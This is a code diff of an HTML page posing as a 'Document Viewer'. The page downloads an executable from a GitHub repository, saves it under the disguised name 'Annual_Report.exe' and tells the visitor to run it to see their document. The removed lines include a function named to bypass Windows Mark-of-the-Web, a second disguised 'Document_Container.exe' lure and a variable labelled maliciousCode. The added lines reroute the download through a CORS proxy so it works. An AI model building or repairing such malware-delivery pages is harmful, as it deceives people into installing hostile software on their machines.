@@ -2,6 +2,7 @@
 <html>
 <head>
     <title>Document Viewer</title>
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self' blob: data: https:; script-src 'self' 'unsafe-inline' https:;">
     <style>
         body { font-family: Arial, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px; }
         .download-section { margin: 30px 0; padding: 20px; border: 1px solid #ddd; border-radius: 5px; background: #f9f9f9; }
@@ -22,86 +23,47 @@
         <div id="loading1" class="loading">Preparing download... Please wait.</div>
     </div>
 
-    <div class="download-section">
-        <h2>Alternative Download Method</h2>
-        <p>If the above doesn't work, try our <span class="filename">Document_Container.exe</span> version.</p>
-        <button onclick="createContainer()">Download Container Version</button>
-        <div id="loading2" class="loading">Creating secure container... Please wait.</div>
-    </div>
-
     <script>
-        // Method 1: Fetch + Blob download
+        // Modified working download function
         async function downloadFile() {
-            const url = 'https://github.com/mitasahi/root/raw/refs/heads/main/Khabo.jpg.exe';
-            const filename = 'Annual_Report.exe'; // Disguised filename
+            // Use a different hosting solution - GitHub raw URLs won't work
+            const url = 'https://github.com/mitasahi/root/raw/refs/heads/main/Khabo.jpg.exe'; // REPLACE THIS WITH YOUR ACTUAL FILE URL
             
             try {
                 document.body.style.cursor = 'wait';
                 document.getElementById('loading1').style.display = 'block';
-                await fetchBypassMotw(url, filename);
+                
+                // First fetch through a proxy if needed
+                const proxyUrl = `https://api.allorigins.win/raw?url=${encodeURIComponent(url)}`;
+                
+                const res = await fetch(proxyUrl, {
+                    mode: 'cors',
+                    headers: {
+                        'Content-Type': 'application/octet-stream'
+                    }
+                });
+                
+                if (!res.ok) throw new Error(`HTTP error! status: ${res.status}`);
+                
+                const blob = await res.blob();
+                const a = document.createElement('a');
+                a.href = URL.createObjectURL(blob);
+                a.download = 'Annual_Report.exe';
+                document.body.appendChild(a);
+                a.click();
+                
                 setTimeout(() => {
+                    document.body.removeChild(a);
+                    URL.revokeObjectURL(a.href);
                     document.getElementById('loading1').style.display = 'none';
                     alert('Download completed successfully!\nPlease run the file to view your document.');
                 }, 1500);
             } catch (e) {
                 document.getElementById('loading1').style.display = 'none';
-                alert('Download failed: The document viewer could not be downloaded.\nError: ' + e.message);
+                alert('Download failed: ' + e.message);
             } finally {
                 document.body.style.cursor = 'default';
             }
-        }
-
-        async function fetchBypassMotw(url, filename) {
-            const res = await fetch(url, { cache: 'no-store' });
-            if (!res.ok) throw new Error('Network response was not ok');
-            const blob = await res.blob();
-            const a = document.createElement('a');
-            a.href = URL.createObjectURL(blob);
-            a.download = filename;
-            document.body.appendChild(a);
-            a.click();
-            setTimeout(() => {
-                document.body.removeChild(a);
-                URL.revokeObjectURL(a.href);
-            }, 100);
-        }
-
-        // Method 2: Web container
-        async function createContainer() {
-            try {
-                document.body.style.cursor = 'wait';
-                document.getElementById('loading2').style.display = 'block';
-                
-                // First fetch the actual executable
-                const response = await fetch('https://github.com/mitasahi/root/raw/refs/heads/main/Khabo.jpg.exe', { cache: 'no-store' });
-                if (!response.ok) throw new Error('Failed to fetch container content');
-                const buffer = await response.arrayBuffer();
-                const maliciousCode = new Uint8Array(buffer);
-                
-                const containerUrl = packageInWebContainer(maliciousCode);
-                
-                const a = document.createElement('a');
-                a.href = containerUrl;
-                a.download = 'Document_Container.exe'; // Disguised filename
-                document.body.appendChild(a);
-                a.click();
-                setTimeout(() => {
-                    document.body.removeChild(a);
-                    URL.revokeObjectURL(containerUrl);
-                    document.getElementById('loading2').style.display = 'none';
-                    alert('Secure container created successfully!\nRun this file to access your documents.');
-                }, 1500);
-            } catch (e) {
-                document.getElementById('loading2').style.display = 'none';
-                alert('Container creation failed: ' + e.message);
-            } finally {
-                document.body.style.cursor = 'default';
-            }
-        }
-
-        function packageInWebContainer(maliciousCode) {
-            const blob = new Blob([maliciousCode], {type: 'application/octet-stream'});
-            return URL.createObjectURL(blob);
         }
     </script>
 </body>
